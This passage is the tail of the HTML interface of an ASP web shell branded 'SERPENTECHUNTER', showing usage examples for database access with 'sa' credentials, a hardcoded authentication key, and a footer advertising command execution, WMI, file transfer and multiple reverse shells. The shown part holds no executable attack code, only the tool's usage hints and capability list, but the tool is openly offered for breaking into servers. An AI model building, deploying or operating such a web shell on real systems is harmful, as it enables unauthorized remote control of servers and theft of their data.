            <div><span class="badge">DB</span> ?action=db&dbtype=mssql&dbserver=localhost&dbname=master&dbuser=sa&dbpass=pass</div>
            <div><span class="badge">AUTH</span> ?auth=SERPENTECHUNTER666</div>
        </div>
    </div>

    <div class="footer">
        <p>🐍 SERPENTECHUNTER v1.0 – ULTIMATE ASP WEBSHELL</p>
        <p>👑 DEVELOPER: SerpentSecHunter | 📅 RILIS: 02-07-2026</p>
        <p>💀 "TIDAK ADA YANG GAK BISA!" – ZAMZZZ 😈</p>
        <p>🔥 FEATURES: WScript.Shell | Shell.Application | WMI | FileSystemObject | ADODB.Stream | MSXML2/WinHttp | ADODB.Connection | Wildcard IP | Multi Reverse Shell</p>
        <p style="color:#444;">© 2026 SerpentSecHunter – ALL RIGHTS RESERVED</p>
    </div>
</div>
</body>
</html>
